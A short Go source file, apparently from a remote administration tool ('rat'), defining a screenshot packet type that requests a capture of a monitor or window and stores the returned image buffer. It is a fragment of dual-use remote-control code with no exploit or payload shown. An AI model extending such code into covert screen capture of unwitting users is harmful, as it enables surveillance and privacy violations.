package main

import (
	"rat/shared/network/header"

	"gopkg.in/mgo.v2/bson"
)

type ScreenPacket struct {
	Activate bool    `network:"send"`
	Scale    float32 `network:"send"`

	// Monitor is true if this is a whole screenshot, or a single window
	Monitor bool `network:"send"`

	// Handle to monitor or window
	Handle int `network:"send"`

	Buffer []byte `network:"receive"`
}

func (packet ScreenPacket) Header() header.PacketHeader {
	return header.ScreenHeader
}

func (packet ScreenPacket) Init(c *Client) {

}

func (packet ScreenPacket) OnReceive(c *Client) error {
	c.Screen.Buffer = packet.Buffer

	c.Screen.New = true

	return nil
}

func (packet ScreenPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
